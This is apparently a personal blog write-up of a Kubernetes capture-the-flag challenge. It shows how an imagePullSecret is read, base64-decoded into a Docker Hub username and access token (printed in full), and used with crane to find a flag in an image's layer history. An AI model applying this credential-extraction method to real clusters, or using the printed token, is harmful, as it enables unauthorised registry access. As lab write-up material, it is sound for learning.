---
title: "EKS Cluster Games: Challenge 2"
date: 2023-11-09T11:28:47+02:00
draft: true
toc: true
series:
  - EKS-cluster-games
---

This is my writeup of how I solved the second challenge of the [EKS Cluster Games](https://eksclustergames.com/).

## Challenge 2 - Registry Hunt

The challenge hints that we should check the container registries. They also link to a rather long post (18 minute read) on [Hells KeyChain](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql). It seemed long, so I skipped it initially.

> A thing we learned during our research: always check the container registries.

### Recon: Pods and secrets

We are told we have the following permissions

```json
{
  "secrets": ["get"],
  "pods": ["list", "get"]
}
```

So, we can't list secrets, but let's see which pods are running

```shell
$ kubectl get pods
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          30h
```
Just a single pod. Does it have anything interesting?

```javascript
$ k get pod database-pod-2c9b3a4e -o json
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "annotations": {
            "kubernetes.io/psp": "eks.privileged",
            [...]
        },
        [...]
    },
    "spec": {
        "containers": [
            {
                "image": "eksclustergames/base_ext_image",
                "imagePullPolicy": "Always",
                [...]
                "volumeMounts": [
                    {
                        "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
                        "name": "kube-api-access-cq4m2",
                        "readOnly": true
                    }
                ]
            }
        ],
        [...]
        "imagePullSecrets": [
            {
                "name": "registry-pull-secrets-780bab1d"
            }
        ],
        [...]
        "volumes": [
            {
                "name": "kube-api-access-cq4m2",
                [...]
            }
        ]
    },
    "status": {
        [...]
        "containerStatuses": [
            {
                "containerID": "containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af",
                "image": "docker.io/eksclustergames/base_ext_image:latest",
                "imageID": "docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623",
                [...]
            }
        ],
        [...]
    }
}
```

I noted a couple of things

- Is it running `eks.privileged`
- It always pulls the image
- It has an `imagePullSecret` named `registry-pull-secrets-780bab1d`
- It has a volume mounted called `kube-api-access-cq4m2`

### Looking into the secrets

Can we get the `kube-api-access-cq4m2` secret? No, it seems not (it later hit me that it was a volume, not a secret)

```
$ k get secret kube-api-access-cq4m2
Error from server (NotFound): secrets "kube-api-access-cq4m2" not found
```

What about the `imagePullSecret`?

```sh
$ k get secret registry-pull-secrets-780bab1d -o json
{
    "apiVersion": "v1",
    "data": {
        ".dockerconfigjson": "eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19"
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "pulumi.com/autonamed": "true"
        },
        "creationTimestamp": "2023-11-01T13:31:29Z",
        "name": "registry-pull-secrets-780bab1d",
        "namespace": "challenge2",
        "resourceVersion": "897340",
        "uid": "1348531e-57ff-42df-b074-d9ecd566e18b"
    },
    "type": "kubernetes.io/dockerconfigjson"
}
```

Success, it had a `.dockerconfigjson`! This seemed to be credentials for the registry at `index.docker.io/v1/`

```sh
$ echo "eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19" | base64 -d
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}
$ echo ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw== | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo%
```
This might be 1 of the secrets which the Hells KeyChain refers to: the private container registry password.

### Getting stuck

What next? After hitting a dead end with the `kube-api-access-cq4m2` I started reading the post on Hells KeyChain.
I found they've found an `imagePullSecret` in the same manner as I.

They also taled about secrets being leaked in Docker layers. Let us look into that.

### Peeling off the layers

The challenge page mentioned a utility called `crane` was installed. So I started toying with it.

I found I could log in to the container registry using `crane auth login docker.io -u eksclustergames -p thepasswordfromabove`, and I was able to interact with the registry

```sh
$ crane ls eksclustergames/base_ext_image
latest
```

I tried listing other images, but there were none. I then searched for a way to get info on the layers, and found that `crane config` would provide me the history of an image

```sh
crane config eksclustergames/base_ext_image
{
    "architecture": "amd64",
    "config": {
        "Env": [
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        ],
        "Cmd": [
            "/bin/sleep",
            "3133337"
        ],
        "ArgsEscaped": true,
        "OnBuild": null
    },
    "created": "2023-11-01T13:32:18.920734382Z",
    "history": [
        {
            "created": "2023-07-18T23:19:33.538571854Z",
            "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
        },
        {
            "created": "2023-07-18T23:19:33.655005962Z",
            "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
            "empty_layer": true
        },
        {
            "created": "2023-11-01T13:32:18.920734382Z",
            "created_by": "RUN sh -c echo 'wiz_eks_challenge{REDACTED}' > /flag.txt # buildkit",
            "comment": "buildkit.dockerfile.v0"
        },
        {
            "created": "2023-11-01T13:32:18.920734382Z",
            "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
            "comment": "buildkit.dockerfile.v0",
            "empty_layer": true
        }
    ],
    "os": "linux",
    "rootfs": {
        "type": "layers",
        "diff_ids": [
            "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
            "sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"
        ]
    }
}
```

and there is was, the command that created the layer containing the flag: `wiz_eks_challenge{REDACTED}` :rocket:


### Could it have been simpler?

Would we have been able to do this without the imagePullSecret? No, it seems not

```sh
$ crane auth logout docker.io
2023/11/02 21:05:35 logged out via /home/user/.docker/config.json
$ crane config eksclustergames/base_ext_image
Error: fetching config: reading image "eksclustergames/base_ext_image": GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]
```

